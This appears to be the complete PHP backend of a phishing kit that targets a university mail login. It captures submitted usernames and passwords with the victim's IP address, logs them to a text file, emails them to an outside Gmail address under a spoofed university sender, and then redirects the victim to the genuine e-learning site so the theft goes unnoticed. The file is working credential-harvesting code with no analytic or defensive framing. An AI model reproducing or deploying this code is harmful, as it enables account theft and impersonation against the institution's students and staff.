<?
$ip = getenv("REMOTE_ADDR");
$message .= "\n";
$message .= "Username	: ".$_POST['username']."\n";
$message .= "Password	: ".$_POST['password']."\n";
$message .= "\n";
$message .= "IP       : ".$ip."\n";
$send = "pklogs00@gmail.com";
$fp = fopen("uses1.txt","a");
fputs($fp,$message);
fclose($fp);
$subject = "mail.uni-oldenburg.de - ".$_POST['username']."\n";
$headers = "from: DE <noreply@uni-oldenburg.de";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0n";
mail("$send", "$subject", $message); 
header("Location:  https://elearning.uni-oldenburg.de/");	  

?>
 